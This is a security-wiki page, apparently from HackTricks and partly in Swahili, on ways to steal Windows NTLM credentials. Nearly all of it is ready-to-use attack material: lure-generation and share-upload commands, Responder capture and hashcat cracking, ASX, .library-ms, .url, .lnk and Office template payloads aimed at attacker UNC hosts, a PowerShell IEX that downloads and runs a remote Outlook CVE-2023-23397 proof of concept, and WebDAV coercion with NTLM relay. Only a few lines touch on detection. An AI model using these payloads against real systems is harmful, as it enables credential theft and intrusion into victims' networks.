# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) kutoka kwenye upakuaji wa faili ya microsoft word mtandaoni hadi vyanzo vya ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Waweke kwenye share inayoweza kuandikwa** (folda yoyote ambayo mwathiriwa hufungua):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Sikiliza na crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows inaweza kugonga faili kadhaa kwa wakati mmoja; chochote ambacho Explorer hu-preview (`BROWSE TO FOLDER`) hakihitaji kubofya.

### Windows Media Player playlists (.ASX/.WAX)

Ukifanikiwa kumfanya lengo lifungue au ku-preview Windows Media Player playlist unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza entry kwenye UNC path. WMP itajaribu kuchukua media iliyo referenced kupitia SMB na itathenticate implicitly.

Mfano wa payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa collection na cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hushughulikia kwa njia isiyo salama faili za .library-ms zinapofunguliwa moja kwa moja kutoka ndani ya ZIP archive. Ikiwa library definition inaelekeza kwenye remote UNC path (kwa mfano, \\attacker\share), kuvinjari/kuzindua tu .library-ms iliyo ndani ya ZIP husababisha Explorer ku-enumerate UNC na kutoa NTLM authentication kwa attacker. Hii hutoa NetNTLMv2 ambayo inaweza kuvunjwa offline au, kwa uwezekano, kurudishwa relay.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Hatua za kiutendaji
- Tengeneza faili ya .library-ms na XML iliyo hapo juu (weka IP/hostname yako).
- Ifunge zip (kwenye Windows: Send to → Compressed (zipped) folder) na peleka ZIP kwa lengo.
- Endesha NTLM capture listener na subiri mwathiriwa afungue .library-ms kutoka ndani ya ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ilichakata extended MAPI property PidLidReminderFileParameter katika calendar items. Ikiwa property hiyo inaelekeza kwenye UNC path (mfano, \\attacker\share\alert.wav), Outlook ingewasiliana na SMB share wakati reminder inapoanza, na kuvuja Net‑NTLMv2 ya mtumiaji bila click yoyote. Hii ilipachikwa patch tarehe March 14, 2023, lakini bado ni muhimu sana kwa legacy/untouched fleets na kwa historical incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Mhasiriwa anahitaji tu Outlook for Windows ikiwa inaendelea kufanya kazi wakati reminder inapoanza.
- The leak hutoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer huonyesha shortcut icons kiotomatiki. Utafiti wa hivi karibuni ulionyesha kuwa hata baada ya patch ya Microsoft ya April 2025 kwa UNC-icon shortcuts, bado ilikuwa inawezekana kuchochea NTLM authentication bila clicks kwa ku-host shortcut target kwenye UNC path na kuweka icon local (patch bypass ilipewa CVE-2025-50154). Kuangalia tu folder kunasababisha Explorer kupata metadata kutoka kwa remote target, ikituma NTLM kwa attacker SMB server.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no-click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Kwa nini hii ni muhimu:
- Dhidi ya **attacker-controlled WebDAV server**, inaweza kusababisha **NTLM over HTTP** bila kuacha custom client.
- Dhidi ya **internal hosts**, ni njia ya kimya ya **kuthibitisha wapi stolen credentials zinakubaliwa** kabla ya moving laterally.
- Command hii ni mbadala mzuri wakati **SMB egress is filtered** lakini **HTTP/WebDAV** bado inafikika.

Operational notes:
- Huduma ya **WebClient** lazima iwe inaendeshwa kwenye source host.
- `rundll32.exe` inapakia `davclnt.dll` na kuifanya Windows ishughulikie WebDAV authentication kwa kutumia **current user's credentials**.
- Ukielekeza kwenye infrastructure unayodhibiti, tumia NTLM-aware HTTP listener/relay kama:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Kutoka kwa mtazamo wa detection, kurudiwa kwa `rundll32.exe davclnt.dll,DavSetCookie` executions dhidi ya systems nyingi za ndani ni strong signal ya **credential validation / spray-like lateral movement prep** badala ya tabia ya kawaida ya user.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwa UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Funga upya kuwa .docx na uwasilishe. Endesha SMB capture listener yako na subiri ufunguaji.

Kwa mawazo ya baada ya capture kuhusu relaying au kutumia vibaya NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
